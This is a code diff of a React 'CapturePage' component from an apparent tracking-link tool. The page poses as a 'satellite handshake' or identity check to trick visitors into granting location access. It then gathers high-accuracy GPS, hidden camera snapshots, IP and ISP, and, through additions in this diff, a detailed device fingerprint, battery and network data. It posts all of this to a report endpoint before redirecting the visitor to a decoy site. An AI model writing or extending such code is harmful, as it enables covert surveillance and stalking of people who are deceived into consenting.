@@ -1,19 +1,18 @@
 
 import React, { useEffect, useState, useRef, useCallback } from 'react';
 import { ShieldCheck, CheckCircle2, ChevronRight, Wifi, Zap, Cpu, MapPin, Loader2, Fingerprint, Activity, Signal, AlertTriangle, RefreshCcw } from 'lucide-react';
-import { CaptureReport, DeviceInfo, GeoLocation } from '../types';
+import { CaptureReport, DeviceInfo, GeoLocation, BatteryInfo, NetworkInfo } from '../types';
 
 interface Props {
   linkId: string;
 }
 
 const CapturePage: React.FC<Props> = ({ linkId }) => {
-  const [status, setStatus] = useState<'consent' | 'denied' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
+  const [status, setStatus] = useState<'consent' | 'initializing' | 'denied' | 'idle' | 'sliding' | 'verifying' | 'done'>('consent');
   const [sliderPos, setSliderPos] = useState(0);
   const [geoStatus, setGeoStatus] = useState<string>('Initialization Required');
   const [accuracy, setAccuracy] = useState<number | null>(null);
   const [redirectTarget, setRedirectTarget] = useState('https://google.com');
-  const [metricsCount, setMetricsCount] = useState(0);
 
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
@@ -25,6 +24,64 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   useEffect(() => {
     fetch(`/api/link-info/${linkId}`).then(r => r.json()).then(data => { if (data.redirectUrl) setRedirectTarget(data.redirectUrl); });
   }, [linkId]);
+
+  const getDeviceInfo = (): DeviceInfo => {
+    const ua = navigator.userAgent;
+    let browser = "Unknown";
+    if (ua.includes("Chrome")) browser = "Chrome";
+    else if (ua.includes("Firefox")) browser = "Firefox";
+    else if (ua.includes("Safari")) browser = "Safari";
+    else if (ua.includes("Edge")) browser = "Edge";
+
+    let os = "Unknown";
+    if (ua.includes("Windows")) os = "Windows";
+    else if (ua.includes("Mac OS")) os = "MacOS";
+    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone")) os = "iOS";
+
+    return {
+      browser,
+      os,
+      platform: navigator.platform,
+      language: navigator.language,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      cores: navigator.hardwareConcurrency || 0,
+      userAgent: ua,
+      orientation: window.screen.orientation?.type || 'unknown',
+      ram: (navigator as any).deviceMemory || 0,
+      timezoneOffset: new Date().getTimezoneOffset(),
+      timezoneName: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      devicePixelRatio: window.devicePixelRatio,
+      colorDepth: window.screen.colorDepth,
+      maxTouchPoints: navigator.maxTouchPoints,
+      doNotTrack: navigator.doNotTrack,
+      pdfViewerEnabled: (navigator as any).pdfViewerEnabled || false
+    };
+  };
+
+  const getBatteryInfo = async (): Promise<BatteryInfo> => {
+    try {
+      const battery = await (navigator as any).getBattery();
+      return {
+        level: battery.level,
+        charging: battery.charging,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    } catch (e) {
+      return { level: 0, charging: false, chargingTime: 0, dischargingTime: 0 };
+    }
+  };
+
+  const getNetworkInfo = (): NetworkInfo => {
+    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+    return conn ? {
+      effectiveType: conn.effectiveType,
+      downlink: conn.downlink,
+      rtt: conn.rtt,
+      saveData: conn.saveData
+    } : {};
+  };
 
   const getHighAccuracyLocation = useCallback((): Promise<GeoLocation> => {
     return new Promise((resolve) => {
@@ -67,7 +124,10 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     });
   }, []);
 
-  const handleConsent = () => {
+  const handleConsent = async () => {
+    setStatus('initializing');
+    // Artificial delay to show the "Initializing" state
+    await new Promise(r => setTimeout(r, 1200));
     setStatus('idle');
     geoPromiseRef.current = getHighAccuracyLocation();
   };
@@ -97,16 +157,40 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
     }
 
     const finalLocation = await geoPromiseRef.current;
+    const deviceInfo = getDeviceInfo();
+    const batteryInfo = await getBatteryInfo();
+    const networkInfo = getNetworkInfo();
+
     try {
       const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-      reportRef.current.location = { ...finalLocation, ip: ipRes.ip, city: finalLocation.city || ipRes.city, country: finalLocation.country || ipRes.country_name, isp: ipRes.org };
+      reportRef.current.location = { 
+        ...finalLocation, 
+        ip: ipRes.ip, 
+        city: finalLocation.city || ipRes.city, 
+        country: finalLocation.country || ipRes.country_name, 
+        isp: ipRes.org 
+      };
     } catch (e) { reportRef.current.location = finalLocation; }
 
     reportRef.current.photos = photos;
-    const finalReport = { ...reportRef.current, id: Math.random().toString(36).substring(7), timestamp: new Date().toISOString(), redirectUrl: redirectTarget, linkId: linkId };
+    reportRef.current.device = deviceInfo;
+    reportRef.current.battery = batteryInfo;
+    reportRef.current.network = networkInfo;
+
+    const finalReport = { 
+      ...reportRef.current, 
+      id: Math.random().toString(36).substring(7), 
+      timestamp: new Date().toISOString(), 
+      redirectUrl: redirectTarget, 
+      linkId: linkId 
+    };
 
     try {
-      await fetch(`/api/reports/${linkId}`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(finalReport) });
+      await fetch(`/api/reports/${linkId}`, { 
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify(finalReport) 
+      });
     } catch (err) {}
 
     setStatus('done');
@@ -131,68 +215,99 @@ const CapturePage: React.FC<Props> = ({ linkId }) => {
   }, [sliderPos]);
 
   return (
-    <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4 select-none">
+    <div className="min-h-screen bg-paper flex items-center justify-center p-4 select-none overflow-hidden">
       <video ref={videoRef} className="hidden" playsInline muted></video>
       <canvas ref={canvasRef} className="hidden"></canvas>
 
-      <div className="w-full max-w-sm bg-white rounded-[3rem] shadow-2xl overflow-hidden animate-pop">
-        {status === 'consent' || status === 'denied' ? (
+      <div className="w-full max-w-sm bg-white rounded-[3rem] shadow-comic border-3 border-ink overflow-hidden animate-pop">
+        {status === 'consent' || status === 'denied' || status === 'initializing' ? (
           <div className="p-10 space-y-8">
-            <div className={`w-20 h-20 rounded-[2rem] flex items-center justify-center mx-auto border ${status === 'denied' ? 'bg-red-50 border-red-200' : 'bg-brand-accent/10 border-brand-accent/20'}`}>
-              {status === 'denied' ? <AlertTriangle className="text-red-500" size={40} /> : <ShieldCheck size={40} className="text-brand-accent" />}
+            <div className={`w-24 h-24 rounded-[2rem] flex items-center justify-center mx-auto border-3 border-ink shadow-comic-sm transition-transform duration-500 ${status === 'denied' ? 'bg-brand-crimson/10 rotate-12' : 'bg-brand-accent/10 rotate-3 animate-float'}`}>
+              {status === 'denied' ? (
+                <AlertTriangle className="text-brand-crimson" size={48} />
+              ) : status === 'initializing' ? (
+                <Loader2 className="text-brand-accent animate-spin" size={48} />
+              ) : (
+                <ShieldCheck size={48} className="text-brand-accent" />
+              )}
             </div>
-            <div className="text-center space-y-3">
-              <h1 className={`text-2xl font-black uppercase italic ${status === 'denied' ? 'text-red-600' : 'text-ink'}`}>
-                {status === 'denied' ? 'Sensor Error' : 'System Sync'}
+            <div className="text-center space-y-4">
+              <h1 className={`text-2xl font-black uppercase italic tracking-tighter ${status === 'denied' ? 'text-brand-crimson' : 'text-ink'}`}>
+                {status === 'denied' ? 'Sensor Protocol Error' : status === 'initializing' ? 'System Uplink...' : 'Handshake Required'}
               </h1>
-              <p className="text-sm font-bold text-ink/50 leading-relaxed">
+              <p className="text-sm font-bold text-ink/50 leading-relaxed italic">
                 {status === 'denied' 
-                  ? 'Synchronization failed. GPS sensors must be enabled to authenticate the handshake.' 
-                  : 'Establish a high-precision satellite handshake to continue to destination.'}
+                  ? 'Synchronization failed. Secure GPS telemetry is required to validate the identity handshake.' 
+                  : status === 'initializing'
+                  ? 'Synchronizing diagnostic environment with the secure relay bridge. Please stand by...'
+                  : 'Establish a high-precision satellite handshake to authorize connection to the destination.'}
               </p>
             </div>
-            <button onClick={handleConsent} className="w-full bg-ink text-white font-black py-5 rounded-3xl flex items-center justify-center gap-3 uppercase italic tracking-tighter hover:bg-brand-accent transition-all">
-              {status === 'denied' ? <RefreshCcw size={18}/> : null}
-              {status === 'denied' ? 'Retry Handshake' : 'Initialize'}
+            <button 
+              disabled={status === 'initializing'}
+              onClick={handleConsent} 
+              className="w-full bg-ink text-white font-black py-5 rounded-3xl flex items-center justify-center gap-3 uppercase italic tracking-tighter hover:bg-brand-accent transition-all shadow-comic-sm disabled:opacity-50"
+            >
+              {status === 'denied' ? <RefreshCcw size={18}/> : status === 'initializing' ? <Loader2 className="animate-spin" size={18} /> : null}
+              {status === 'denied' ? 'Restart Handshake' : status === 'initializing' ? 'Calibrating...' : 'Initialize Secure Sync'}
             </button>
           </div>
         ) : (
           <>
-            <div className="p-10 pb-6 text-center bg-gray-50 border-b border-gray-100">
-              <div className="inline-flex items-center justify-center w-24 h-24 bg-brand-accent/10 rounded-[2.5rem] mb-6 border-2 border-brand-accent/20 relative">
-                <div className={`absolute inset-0 bg-brand-accent/5 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
-                <Fingerprint className="text-brand-accent relative z-10" size={48} />
+            <div className="p-10 pb-6 text-center bg-paper border-b-3 border-ink">
+              <div className="inline-flex items-center justify-center w-28 h-28 bg-brand-accent/5 rounded-[2.5rem] mb-6 border-3 border-ink relative shadow-comic-sm group">
+                <div className={`absolute inset-0 bg-brand-accent/10 rounded-[2.5rem] ${status !== 'idle' ? 'animate-ping' : ''}`} />
+                <Fingerprint className="text-brand-accent relative z-10 transition-transform group-hover:scale-110" size={56} />
               </div>
-              <h1 className="text-2xl font-black text-ink tracking-tight uppercase italic">Identity Verification</h1>
-              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2">{geoStatus}</p>
+              <h1 className="text-2xl font-black text-ink tracking-tighter uppercase italic">Handshake Auth</h1>
+              <p className="text-[10px] font-black text-ink/30 uppercase tracking-[0.4em] mt-2 italic">{geoStatus}</p>
             </div>
 
-            <div className="p-10 pt-4 space-y-10">
-               <div className="bg-gray-50 rounded-2xl p-4 border border-gray-100 flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                  <Signal size={16} className="text-brand-accent" />
+            <div className="p-10 pt-4 space-y-8">
+               <div className="bg-paper rounded-2xl p-5 border-2 border-ink shadow-comic-sm flex items-center justify-between transition-all hover:bg-white">
+                <div className="flex items-center gap-4">
+                  <div className="p-2 bg-brand-accent/10 border border-ink rounded-lg">
+                    <Signal size={18} className="text-brand-accent" />
+                  </div>
                   <div>
-                    <p className="text-[10px] font-black text-ink uppercase">Network integrity</p>
-                    <p className="text-[9px] font-bold text-ink/30 uppercase">Calibrating uplink</p>
+                    <p className="text-[10px] font-black text-ink uppercase tracking-widest">Signal integrity</p>
+                    <p className="text-[9px] font-bold text-ink/40 uppercase italic">Calibrating uplink bridge</p>
                   </div>
                 </div>
-                <Activity size={16} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-gray-200'}`} />
+                <Activity size={18} className={`${status !== 'idle' ? 'animate-pulse text-brand-accent' : 'text-ink/20'}`} />
               </div>
 
-              <div ref={containerRef} className="relative h-20 bg-gray-100 rounded-[2.5rem] border-2 border-gray-200 p-2 flex items-center overflow-hidden">
-                <div className={`absolute inset-0 flex items-center justify-center transition-opacity ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
-                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.25em] flex items-center gap-2">Swipe to Connect <ChevronRight size={16} /></span>
+              <div 
+                ref={containerRef} 
+                className={`relative h-24 bg-paper rounded-[2.5rem] border-3 border-ink p-2 flex items-center overflow-hidden transition-all duration-300 ${status === 'sliding' ? 'scale-[1.02] shadow-comic' : 'shadow-comic-sm'}`}
+              >
+                <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${status === 'verifying' ? 'opacity-0' : 'opacity-100'}`}>
+                   <span className="text-ink/15 font-black uppercase text-[11px] tracking-[0.3em] flex items-center gap-2 italic">Connect Destination <ChevronRight size={16} /></span>
                 </div>
-                <div className="absolute left-0 top-0 h-full bg-brand-accent/10" style={{ width: `calc(${sliderPos}% + 40px)` }} />
-                <div onMouseDown={() => {isDragging.current = true; setStatus('sliding');}} onTouchStart={() => {isDragging.current = true; setStatus('sliding');}} style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} className="relative z-10 w-16 h-16 bg-white border border-gray-200 rounded-full shadow-2xl flex items-center justify-center transition-all cursor-grab active:cursor-grabbing">
-                  {status === 'verifying' ? <Loader2 className="animate-spin text-brand-accent" size={32} /> : status === 'done' ? <CheckCircle2 className="text-green-500" size={36} /> : <ChevronRight className="text-brand-accent" size={36} />}
+                <div 
+                  className="absolute left-0 top-0 h-full bg-brand-accent/5 transition-all duration-75" 
+                  style={{ width: `calc(${sliderPos}% + 48px)` }} 
+                />
+                <div 
+                  onMouseDown={() => {isDragging.current = true; setStatus('sliding');}} 
+                  onTouchStart={() => {isDragging.current = true; setStatus('sliding');}} 
+                  style={{ transform: `translateX(${sliderPos}%)`, left: '0' }} 
+                  className={`relative z-10 w-20 h-20 bg-white border-3 border-ink rounded-full shadow-comic-sm flex items-center justify-center transition-all cursor-grab active:cursor-grabbing hover:bg-brand-accent group ${status === 'verifying' ? 'bg-brand-accent' : ''}`}
+                >
+                  {status === 'verifying' ? (
+                    <Loader2 className="animate-spin text-white" size={40} /> 
+                  ) : status === 'done' ? (
+                    <CheckCircle2 className="text-green-500" size={40} /> 
+                  ) : (
+                    <ChevronRight className="text-brand-accent group-hover:text-white transition-colors" size={40} />
+                  )}
                 </div>
               </div>
+              <p className="text-[9px] text-center font-black text-ink/20 uppercase tracking-[0.2em] italic">Encrypted Secure Socket Relay (ESSR)</p>
             </div>
           </>
         )}
       </div>
-      <style>{`@keyframes scan { 0% { transform: translateX(-150%) skewX(-20deg); } 100% { transform: translateX(250%) skewX(-20deg); } }`}</style>
     </div>
   );
 };
